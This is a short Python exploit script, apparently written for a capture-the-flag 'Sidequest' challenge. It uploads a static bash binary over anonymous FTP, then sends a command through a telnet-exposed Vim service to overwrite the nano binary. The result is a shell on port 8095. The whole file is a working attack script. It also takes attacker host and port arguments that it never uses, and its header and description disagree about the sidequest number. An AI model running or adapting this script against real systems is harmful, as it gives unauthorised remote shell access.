# Sidequest4 exploit script
import argparse
import telnetlib
import time
from ftplib import FTP


# Function to send Vim commands
def sendVimCommand(conn, command):
    try:
        conn.write(command.encode('utf-8') + b'\n') 
        time.sleep(1) # Just to make sure everything works fine
        return 200
    except Exception as e:
        with open("logs", 'a') as logfile:
            logfile.write(f'{str(e)}\n--------------------------')
        return 404


# Function to upload binaries through FTP
def uploadBinary(filePath, name):
    ftpPort = 8075
    ftp = FTP()
    ftp.connect(address, ftpPort)
    ftp.set_pasv(False)
    authStatus = ftp.login()
    
    if '230' in authStatus:
        with open(filePath, 'rb') as f:
            try:
                ftp.storbinary(f'STOR {name}', f)
                return 200
            except Exception as e:
                with open("logs", 'a') as logfile:
                    logfile.write(f'{str(e)}\n--------------------------')
                return 404




def main(address):
    vimPort = 8085

    # Upload bash static binary into the target machine through ftp
    status = uploadBinary('./binaries/bash', 'bash')
    if status == 200:
        print("Bash static binary uploaded successfully!")
    else:
        print("Error occured, check logs")
    

    # Open the uploaded bash and overwrite the nano binary
    try:
        print("Overwriting nano binary with bash . . .")
        conn = telnetlib.Telnet(address, vimPort)
        command = ':edit /tmp/ftp/bash | :w! /tmp/nano | :q' # This command opens /tmp/ftp/bash and save (overwrites) as /tmp/nano
        response = sendVimCommand(conn, command)
        time.sleep(2)

        if response == 404:
            print("Error occured, check logfile.")
            return

        print("Bash shell now accessible on port 8095")
    finally:
        conn.close()








if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Sidequest 3 pwn script')
    parser.add_argument("--address", "-a", dest = "address", required = True, help = "Server IP Address")
    parser.add_argument("--lhost", "-lh", dest = "lhost", required = True, help = "Attacker Host IP")
    parser.add_argument("--lport", "-lp", dest = "lport", required = True, help = "Attacker Listener Port")
    args = parser.parse_args()
    address = args.address
    lhost = args.lhost
    lport = args.lport
    main(address)

